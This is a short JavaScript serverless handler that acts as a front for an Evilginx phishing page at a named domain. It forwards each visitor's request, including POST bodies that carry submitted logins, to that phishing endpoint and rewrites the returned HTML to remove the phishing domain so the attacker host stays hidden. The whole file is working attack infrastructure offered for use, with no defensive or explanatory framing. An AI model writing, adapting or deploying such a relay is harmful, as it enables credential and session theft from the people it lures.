export default async (req, res) => {
    const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob"; // YOUR PHISHING PAGE
    
    // Forward request to Evilginx
    const response = await fetch(EVILGINX_URL, {
        method: req.method,
        headers: {
            'X-Forwarded-Host': req.headers.host, // Hide Evilginx domain
            'User-Agent': 'Mozilla/5.0'
        },
        body: req.method === 'POST' ? req.body : null
    });
    
    // Return cleaned response
    let html = await response.text();
    html = html.replace(/https:\/\/login\.espeharete\.top/g, ''); // Remove Evilginx URLs
    res.status(200).send(html);
};
